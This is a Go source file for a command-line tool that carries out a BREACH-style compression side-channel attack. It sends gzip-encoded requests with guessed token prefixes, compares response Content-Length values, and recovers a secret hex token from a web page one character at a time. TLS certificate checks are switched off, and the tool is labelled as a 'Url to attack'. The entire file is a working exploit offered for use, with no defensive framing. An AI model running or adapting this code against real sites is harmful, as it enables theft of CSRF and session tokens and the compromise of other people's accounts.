package main

import (
	"fmt"
	"net/http"
	"crypto/tls"
	"strconv"
	"flag"
)

type answer struct {
	test string
	l int64
}

func get_size(Url string, Token string, Next string, Padding string, c chan answer) {
	final := Url + Token + Next + Padding
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	req, err := http.NewRequest("GET", final, nil)
	if err != nil { fmt.Println(err) }
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	resp, err := client.Do(req)
	if err != nil { fmt.Println(err) }
	l, err := strconv.ParseInt(resp.Header.Get("Content-Length"), 0, 64)
	if err != nil { fmt.Println(err) }
	defer resp.Body.Close()
	c <- answer{Next, l}
}

func prune(Url string, Token string, Options [16]string, Padding string, collisions []answer, target int64) answer{
     var possible []answer
     ch := make(chan answer, 16*len(collisions))
     for _,coll := range collisions {
          for _,opt := range Options {
               go get_size(Url, Token, coll.test + opt, Padding, ch)
          }
     }
     for i:= 0; i < 16*len(collisions) ; i++ {
          a := <-ch
          if a.l == target {
               possible = append(possible, a)
          }
     }
     var comm answer
     if len(possible) > 0 {
          comm = possible[0]
          comm.test = comm.test[0:1]
     } else {
          var new_coll []answer
          for _, el := range Options {
               new_coll = append(new_coll, answer{el, target})
          }
          comm = prune(Url, Token, Options, Padding, new_coll, target)
     }
     return comm
}


func try_many(Url string, Options [16]string, Token string, Padding string, max_size int) string {
	fmt.Print("\r[*]Trying: ", Token)
	ch := make(chan answer, 16)
	flag := false
	var collisions []answer
	for _, element := range Options {
		go get_size(Url, Token, element, Padding, ch)
	}
	min := answer{"", 888888}
	for range Options {
		a := <-ch
		if a.l < min.l {
			min = a
			flag = false
		} else if a.l == min.l {
			flag = true
			collisions = append(collisions, a)
		}
	}
	if flag {
		min = prune(Url, Token, Options, Padding, collisions, min.l)
	}
	Token = Token + min.test
	if len(Token) < max_size {
		Token = try_many(Url, Options, Token, Padding, max_size)
	}
	return Token
}

func main() {
	// URL Argument -url=foo
	urlPtr := flag.String("url", "https://malbot.net/poc/", "Url to attack")
	// PARAM Argument -param=foo
	paramPtr := flag.String("param", "request_token", "Parameter to attack")
	// PADDING Argument -padding=foo
	paddingPtr := flag.String("padding", "{}{}{}{}{}", "Padding after token")
	
	// LENGTH Argument -len=32
	lenPtr := flag.Int("len", 32, "Length of the desired output")
	
	// OPTIONS
	Options := [16]string{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"}
	flag.Parse()
	

	// MAIN
        fmt.Println("    ; ____________ _____ ___  _____ _   _ ")
	fmt.Println("    \\ | ___ \\ ___ \\  ___/ _ \\/  __ \\ | | |")
	fmt.Println("  __/_| |_/ / |_/ / |__/ /_\\ \\ /  \\/ |_| |")
	fmt.Println(" / _` | ___ \\    /|  __|  _  | |   |  _  |")
	fmt.Println("| (_| | |_/ / |\\ \\| |__| | | | \\__/\\ | | |")
	fmt.Println(" \\__, \\____/\\_| \\_\\____|_| |_/\\____|_| |_/")
	fmt.Println("  __/ |                                   ")
	fmt.Println(" |___/                                    ")
	fmt.Println("+----------------------------------------+")
	fmt.Println(" *Url: ", *urlPtr)
	fmt.Println(" *Param: ", *paramPtr)
	fmt.Println(" *Padding: ", *paddingPtr)
	fmt.Println(" *Length: ", *lenPtr)
	fmt.Println("+----------------------------------------+\n")
	out := try_many(*urlPtr + "?" + *paramPtr + "='", Options, "", *paddingPtr, *lenPtr)
	fmt.Println("\n--------")
	fmt.Println("Output: " + out)
}
